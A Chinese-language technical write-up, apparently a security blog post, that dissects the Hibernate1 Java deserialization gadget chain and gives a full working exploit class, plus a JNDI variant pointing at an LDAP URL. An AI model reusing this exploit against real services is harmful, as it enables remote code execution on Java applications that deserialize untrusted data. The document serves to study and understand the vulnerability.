# Hibernate

开源的一个 ORM (建议补一下软件工程)框架，用户量极其庞大，Hibernate1（现在有1和2两个） 依旧是利用 TemplatesImpl 这个类，找寻 `_outputProperties` 的 getter 方法的调用链。

## exp

```java
package dem0.deserialization.Hibernate;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.hibernate.type.Type;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import sun.reflect.ReflectionFactory;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Hibernate1  {
    public static void main(String[] args) throws Exception {
        Class<?> componentTypeClass             = Class.forName("org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass     = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Object templatesImpl = Gadgets.createTemplatesImpl("calc");
        Method method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
        Object getter;
        try{
            Class<?> aClass = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, method);
        }catch (Exception pas){
            Class<?> accessor = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = accessor.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(templatesImpl.getClass(),method,"OutputProperties");
        }

        //新建一个PojoComponentTuplizer
        PojoComponentTuplizer pojo = (PojoComponentTuplizer) Reflections.createWithoutConstructor(pojoComponentTuplizerClass);

        //给他的getters 赋值
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(pojo,getters);

        //新建一个ComponentType
        ComponentType componentType = (ComponentType) Reflections.createWithoutConstructor(componentTypeClass);

        //设置他的属性 ==> 触发getPropertyValues
        Field Tuplizer = componentTypeClass.getDeclaredField("componentTuplizer");
        Tuplizer.setAccessible(true);
        Tuplizer.set(componentType,pojo);
        Field field2 = componentTypeClass.getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(componentType, 1);
        Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
        field3.setAccessible(true);
        field3.set(componentType, new Type[]{(Type) componentType});


        //TypedValue
        TypedValue typedValue = new TypedValue((Type) componentType, null);

        HashMap<Object, Object> hashMap = new HashMap();
        hashMap.put(typedValue, "dem0");

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, templatesImpl);
        byte[] ser = Serializer.serialize(hashMap);
        Deserializer.deserialize(ser);
    }
}

```



## 分析

### BasicPropertyAccessor

> Accesses property values via a get/set pair, 

可以看到这个类里面有两个内部类`BasicGetter`和`BasicSetter`,我们主要来看`BasicGetter`.

![image-20220513193559708](https://img.dem0dem0.top/images/image-20220513193559708.png)

可以看到这个类实例化的时候有三个属性，`class method propertyName`,非常像我们在反射调用时候需要使用到的数据。

![image-20220513193740008](https://img.dem0dem0.top/images/image-20220513193740008.png)

可以知道这个类在反序列化的时候是这样创建的。

```java
	private static Method getterMethod(Class theClass, String propertyName) {
		Method[] methods = theClass.getDeclaredMethods();
		for ( Method method : methods ) {
			// if the method has parameters, skip it
			if ( method.getParameterTypes().length != 0 ) {
				continue;
			}
			// if the method is a "bridge", skip it
			if ( method.isBridge() ) {
				continue;
			}
			final String methodName = method.getName();
			// try "get"
			if ( methodName.startsWith( "get" ) ) {
				String testStdMethod = Introspector.decapitalize( methodName.substring( 3 ) );
				String testOldMethod = methodName.substring( 3 );
				if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) {
					return method;
				}
			}
			// if not "get", then try "is"
			if ( methodName.startsWith( "is" ) ) {
				String testStdMethod = Introspector.decapitalize( methodName.substring( 2 ) );
				String testOldMethod = methodName.substring( 2 );
				if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) {
					return method;
				}
			}
		}
		return null;
	}
```

可以看到最后的处理过程，不用多说，我们回到`BasicPropertyAccessor`.

```java
Object templatesImpl = Gadgets.createTemplatesImpl("calc");
BasicPropertyAccessor accessor = new BasicPropertyAccessor();
Getter getter = accessor.getGetter(templatesImpl.getClass(), "outputProperties");
getter.get(templatesImpl);
```

这样就可以触发了。所以我们继续倒着挖掘。

### AbstractComponentTuplizer

有了上面的基础，我们现在的问题在于找到一个调用了`get`方法的地方。`AbstractComponentTuplizer#getPropertyValues`会调用成员变量`getters[i].get`.

![image-20220513195014959](https://img.dem0dem0.top/images/image-20220513195014959.png)

但是这个类是`Abstract`,无法直接实例化，所以找他的子类。

![image-20220513195355676](https://img.dem0dem0.top/images/image-20220513195355676.png)

一个是 PojoComponentTuplizer，一个是 DynamicMapComponentTuplizer，这对应着 Hibernate 的实体对象的类型，即 pojo 和 dynamic-map。pojo 代表将 Hibernate 类型映射为 Java 实体类，而 dynamic-map 将映射为 Map 对象。

这里exp中选择的是**PojoComponentTuplizer**。

![image-20220513195504787](https://img.dem0dem0.top/images/image-20220513195504787.png)

最后会调用到上面的方法.我们使用idea查看还有哪些调用。

![image-20220513195652076](https://img.dem0dem0.top/images/image-20220513195652076.png)

可以看到调用的地方很少。`ComponentType#getPropertyValue` 

### TypedValue

一个 final class，用来映射一个 Object 的值和对应的 Hibernate type。Hibernate 中定义了一个自己的类型接口 `org.hibernate.type.Hibernate.Type`，用来定义 Java 类型和一个或多个 JDBC 类型之间的映射。针对不同的类型有不同的实现类，开发人员也可以自己实现这个接口来自定义类型。而 TypedValue 就同时储存一个 Type 和 Object 的映射。上一部分最后提到的 ComponentType 就是 Type 的实现类。

![image-20220513200334644](https://img.dem0dem0.top/images/image-20220513200334644.png)

![image-20220513200349433](https://img.dem0dem0.top/images/image-20220513200349433.png)

可以看到在初始化的时候还调用了`initTransients`,同时好玩的是我们在readobject同样发现了调用。出于敏感发现了hashcode的方法

![image-20220513200653791](https://img.dem0dem0.top/images/image-20220513200653791.png)

我们去看看ValueHolder的getValue方法。

![image-20220513200736402](https://img.dem0dem0.top/images/image-20220513200736402.png)

![image-20220513200805450](https://img.dem0dem0.top/images/image-20220513200805450.png)

就会调用getHashCode方法。假如这个type刚好是`ComponentType`.

![image-20220513200930100](https://img.dem0dem0.top/images/image-20220513200930100.png)

我们发现ComponentType#getHashCode方法刚好调用了`getPropertyValue`,现在链子就闭合了。

### GetterMethodImpl

在 Hibernate1 5.x 里，实现了 `org.hibernate.property.access.spi.GetterMethodImpl` 类，这个类能够替代 `BasicPropertyAccessor$BasicGetter.get()` 来调用 getter 方法。

## 拓展

在不同版本中，由于部分类的更新交替，利用的 Gadget 细节则不同。ysoserial 中也根据不同情况给出了需要修改的利用链：

- 使用 `org.hibernate.property.access.spi.GetterMethodImpl` 替代 `org.hibernate.property.BasicPropertyAccessor$BasicGetter`。
- 使用 `org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping` 来对 PojoComponentTuplizer 进行封装。

是jndi的时候

```java
JdbcRowSetImpl rs = new JdbcRowSetImpl();
rs.setDataSourceName("ldap://127.0.0.1:23457/Command8");
Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");
```

## 总结

`hashMap#readobject`==>`typedValue#hashcode`==>`ValueHolder#getvalue`==>`componentType(propertySpan=1,propertyTypes=new Type[]{(Type) componentType})#getHashcode`==>`componentType#getPropertyValue`==>`PojoComponentTuplizer#getPropertyValue`==>`AbstractComponentTuplizer#getPropertyValue`==>`BasicPropertyAccessor#get`.

